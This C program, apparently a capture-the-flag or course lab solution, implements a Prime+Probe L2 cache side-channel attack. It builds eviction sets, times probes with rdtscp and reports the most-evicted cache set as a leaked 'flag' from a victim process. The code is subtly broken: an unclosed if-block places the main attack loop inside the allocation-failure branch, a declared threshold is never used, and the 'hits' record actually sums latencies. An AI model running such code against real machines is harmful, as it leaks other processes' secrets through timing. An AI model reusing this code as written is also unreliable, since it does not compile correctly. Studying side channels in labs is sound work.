#include "util.h"
// mman library to be used for hugepage allocations (e.g. mmap or posix_memalign only)
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>


#define L2_ASSOCIATIVITY 16
#define L2_SETS 1024 
#define BASE_SET 64
#define PAGE_SIZE (1 << 21) // 2 MB
#ifndef SET_STRIDE_BYTES 
#define SET_STRIDE_BYTES (1 << 16) 
#endif

// Linked List so that the CPU will have to follow the chain of pointers, which will cause cache evictions
struct linked_list_node {
    struct linked_list_node *next;
    char padding[BASE_SET - (sizeof(struct linked_list_node *))];
};

// Variables for the work area and the linked list chains for each cache set
void *work_area;
struct linked_list_node *set_chains[L2_SETS];

// Calculate Latency Difference through rdtscp
static inline uint64_t rdtscp(void) {
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo; // output is the time stamp counter
}

// Shuffle the pointers in the linked list to break predictable memory access patterns to ensure the prime + probe measurements are accurate
void shuffle_pointers(struct linked_list_node **nodes, int count) {
    for (int i = count - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        struct linked_list_node *temp = nodes[i];
        nodes[i] = nodes[j];
        nodes[j] = temp;
    }
}

// Construct eviction sets for a given set ID 
void eviction_set_construction(int logical_set_id) {
    char *base = (char *)work_area;
    struct linked_list_node *nodes[L2_ASSOCIATIVITY];
    for (int way = 0; way < L2_ASSOCIATIVITY; way++) {
        nodes[way] = (struct linked_list_node *)((base + (logical_set_id * BASE_SET)) + (way * SET_STRIDE_BYTES));
    }
    shuffle_pointers(nodes, L2_ASSOCIATIVITY);
    for (int way = 0; way < L2_ASSOCIATIVITY - 1; way++) {
        nodes[way]->next = nodes[way + 1];
    }
    nodes[L2_ASSOCIATIVITY - 1]->next = NULL;
    set_chains[logical_set_id] = nodes[0];
}

// Prime the cache by following the linked list for the given set ID
void prime_cache(int set_id) {
    for(int i = 0; i < L2_ASSOCIATIVITY; i++) {
        volatile struct linked_list_node *current = set_chains[set_id];
        while (current) {
            current = current->next;
        }
    }
}

// Probe the cache by measuring the time taken to follow the linked list for the given set ID
uint64_t probe_cache(int set_id) {
    uint64_t start_time = rdtscp();
    volatile struct linked_list_node *current = set_chains[set_id];
    while (current) {
        current = current->next;
    }
    return rdtscp() - start_time; // return the latency of probing the cache
}

// 

int main(int argc, char const *argv[]) {
    srand(time(NULL));

    // Allocate a large memory region for the work area using hugepages
    work_area = mmap(NULL,
                     PAGE_SIZE,
                     PROT_READ | PROT_WRITE,
                     MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
                     -1,
                     0);
    if(work_area == MAP_FAILED) {
        perror("hugepage map failed, trying regular page");
        work_area = mmap(NULL,
                     PAGE_SIZE,
                     PROT_READ | PROT_WRITE,
                     MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE,
                     -1,
                     0);
        if(work_area == MAP_FAILED) {
            exit(EXIT_FAILURE);
    }

    memset(work_area, 0, PAGE_SIZE); // Initialize the work area with zeros
    uint64_t record[L2_SETS];
    memset(record, 0, sizeof(record)); // Record the number of hits for each set

    // Eviction set constructed for L2 cache sets
    for(int i = 0; i < L2_SETS; i++) {
        eviction_set_construction(i);
    }

    
    uint64_t threshold = 295; // From Part 01 Timing Graph 
    int rounds = 3000; // High statistical rate to go above noise of measurements

    for(int r = 0; r < rounds; r++) {
        for(int s = 0; s < L2_SETS; s++) {
            prime_cache(s);
            // Waiting for Victim to access the cache line
            for(volatile int wait= 0; wait < 100; wait++);
            asm volatile("lfence");
            uint64_t latency = probe_cache(s);
            asm volatile("lfence");
            record[s] += latency;
        }
    }

    // Find the set with the maximum number of hits
    int flag = -1;
    uint64_t max_hits = 0;
    for(int i = 0; i < L2_SETS; i++) {
        if(record[i] > max_hits) {
            max_hits = record[i];
            flag = i;
        }
    }
    printf("\nDetected Flag: %d (Score: %lu)\n", flag, max_hits);
    return 0;
}
